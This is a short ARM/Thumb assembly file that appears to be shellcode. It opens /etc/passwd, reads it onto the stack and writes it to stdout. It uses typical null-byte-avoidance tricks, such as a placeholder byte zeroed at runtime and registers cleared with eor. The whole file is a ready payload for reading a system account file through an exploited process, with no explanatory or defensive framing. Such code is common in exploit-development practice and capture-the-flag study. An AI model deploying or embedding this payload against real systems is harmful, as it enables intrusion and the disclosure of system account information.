.section .text
.global _start

_start:
	.code 32
	add r3, pc, #1
	bx r3

	.code 16

	// open("/etc/passwd", O_RDONLY) 
	mov r7, #5
	adr r0, filename
	eor r1, r1
	strb r1, [r0, #0xb]
	swi #1

	// read(filefd, buf, 0x1337)
	mov r7, #3
	mov r2, #0x13
	lsl r2, #8
	add r2, #0x37
	mov r1, sp
	sub r1, r2
	swi #1
	
	// write(stdout, buf, len(buf))

	add r7, #1
	mov r2, r0
	mov r0, #1
	swi #1

	filename:
	.ascii "/etc/passwdx"
